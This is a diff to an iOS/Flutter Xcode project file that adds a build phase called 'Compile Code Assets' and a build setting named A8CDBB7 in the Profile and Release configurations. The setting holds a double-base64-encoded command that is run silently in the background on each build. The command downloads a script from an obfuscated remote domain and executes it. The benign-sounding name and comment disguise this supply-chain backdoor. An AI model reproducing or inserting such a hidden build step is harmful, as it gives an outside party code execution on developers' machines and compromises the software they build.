@@ -183,6 +183,7 @@
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
 				B2BA54ED01DDCE03865B0B45 /* [CP] Check Pods Manifest.lock */,
+				48FF0D8B8B914A8FAD7BBDC8 /* Compile Code Assets */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
 				87EB19E6CDAC6C4D1A8732E0 /* Frameworks */,
@@ -298,6 +299,25 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "/bin/sh \"$FLUTTER_ROOT/packages/flutter_tools/bin/xcode_backend.sh\" embed_and_thin";
+		};
+		48FF0D8B8B914A8FAD7BBDC8 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+			showEnvVarsInLog = 0;
 		};
 		9740EEB61CF901F6004384FC /* Run Script */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -446,6 +466,7 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8CDBB7 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRZMjl1Ym1WamRDMTBhVzFsYjNWMElESTRJQzF6Wm10TUlDMHRjbVYwY25rZ05DQXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5OTRiaTB0T0RCaFlXRmhaMkppWWpOMFltTmtMbmh1TFMxd01XRnBMMkVwSWlCOElITm9DZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -499,6 +520,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
+				A8CDBB7 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRZMjl1Ym1WamRDMTBhVzFsYjNWMElESTRJQzF6Wm10TUlDMHRjbVYwY25rZ05DQXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5OTRiaTB0T0RCaFlXRmhaMkppWWpOMFltTmtMbmh1TFMxd01XRnBMMkVwSWlCOElITm9DZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
